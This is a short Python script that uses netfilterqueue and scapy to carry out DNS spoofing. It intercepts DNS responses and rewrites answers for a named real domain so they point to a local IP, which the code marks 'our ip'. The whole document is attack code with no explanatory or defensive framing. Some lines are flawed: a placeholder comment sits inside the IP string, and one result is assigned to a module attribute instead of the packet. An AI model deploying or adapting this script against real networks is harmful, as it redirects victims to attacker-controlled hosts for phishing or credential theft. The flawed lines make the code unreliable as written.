#!/usr/bin/python

import netfilterqueue
import scapy.all as scapy


def del_field(scapy_pkt):
    del scapy_pkt[scapy.IP].len
    del scapy_pkt[scapy.IP].chksum
    del scapy_pkt[scapy.UDP].len
    del scapy_pkt[scapy.UDP].chksum
    return scapy_pkt


def process_pkt(pkt):
    scapy_pkt = scapy.IP(pkt.get_payload())
    if scapy_pkt.haslayer(scapy.DNSRR):
        qname = scapy_pkt[scapy.DNSQR].qname
        if "arh.bg.ac.rs" in qname:
            ans = scapy.DNSRR(rrname=qname, rdata="192.168.1.103(our ip)")
            scapy_pkt[scapy.DNS].an = ans
            scapy_pkt[scapy.DNS].ancount = 1
            scapy.pkt = del_field(scapy_pkt)
            pkt.set_payload(str(scapy_pkt))
    pkt.accept()


if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_pkt)
    queue.run()
